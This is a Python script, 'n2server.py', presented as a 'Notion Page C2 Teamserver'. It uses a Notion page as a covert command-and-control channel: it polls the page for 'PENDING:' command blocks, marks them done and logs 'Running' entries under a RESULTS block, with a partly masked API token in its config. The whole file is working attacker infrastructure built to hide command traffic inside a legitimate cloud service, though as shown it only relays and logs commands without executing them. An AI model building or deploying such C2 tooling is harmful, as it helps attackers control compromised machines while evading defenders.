# n2server.py
import requests
import time
from datetime import datetime

# === CONFIG ===
NOTION_TOKEN = "ntn_xxxxxxxx369JDEl1slzXmrV6M6xxxxxxxxxxxxxxxxxxxx"
PAGE_ID      = "xxxxxxxxxxx9803c8061c9xxxxxxxxxx"   # ← 32-char only
CHECK_INTERVAL = 15
# ==============

HEADERS = {
    "Authorization": f"Bearer {NOTION_TOKEN}",
    "Notion-Version": "2022-06-28",
    "Content-Type": "application/json",
}

BASE_URL = f"https://api.notion.com/v1/blocks/{PAGE_ID}/children"

def get_blocks():
    r = requests.get(BASE_URL, headers=HEADERS)
    if r.status_code != 200:
        print(f"[!] API error {r.status_code}: {r.text}")
        return []
    return r.json().get("results", [])

def append_to_results(text):
    blocks = get_blocks()
    results_block_id = None
    
    for b in blocks:
        if b.get("type") != "paragraph":
            continue
        # Combine all rich_text pieces and lower-case for comparison
        full_text = "".join(t["text"]["content"] for t in b["paragraph"]["rich_text"]).lower()
        if "result" in full_text:                     # ← matches RESULTS, Results, result, etc.
            results_block_id = b["id"]
            break

    if not results_block_id:
        print("[!] RESULTS block not found — creating one now...")
        payload = {
            "children": [{
                "object": "block",
                "type": "paragraph",
                "paragraph": {"rich_text": [{"type": "text", "text": {"content": "RESULTS:"}}]}
            }]
        }
        r = requests.patch(BASE_URL, headers=HEADERS, json=payload)
        if r.status_code == 200:
            print("[+] Created new RESULTS: block automatically")
            return True
        else:
            print("[!] Failed to auto-create RESULTS block")
            return False

    payload = {
        "children": [{
            "object": "block",
            "type": "paragraph",
            "paragraph": {
                "rich_text": [{"type": "text", "text": {"content": text}}]
            }
        }]
    }
    r = requests.patch(f"https://api.notion.com/v1/blocks/{results_block_id}/children",
                       headers=HEADERS, json=payload)
    return r.status_code == 200

def clear_pending():
    blocks = get_blocks()
    for b in blocks:
        if b.get("type") == "paragraph":
            full_text = "".join(t["text"]["content"] for t in b["paragraph"]["rich_text"])
            if full_text.lower().startswith("pending:") and "done" not in full_text.lower():
                cmd = full_text.split(":", 1)[1].strip()
                # Clear it to "done"
                requests.patch(f"https://api.notion.com/v1/blocks/{b['id']}",
                              headers=HEADERS,
                              json={"paragraph": {"rich_text": [{"type": "text", "text": {"content": "PENDING: done"}}]}})
                return cmd
    return None

print("[+] Notion Page C2 Teamserver started.....;)")
print(f"[+] Page ID: {PAGE_ID}\n")

while True:
    cmd = clear_pending()
    if cmd:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[+] New command → {cmd}")
        append_to_results(f"\n[{ts}] Running: {cmd}")
    else:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Waiting for commands...", end="\r")

    time.sleep(CHECK_INTERVAL)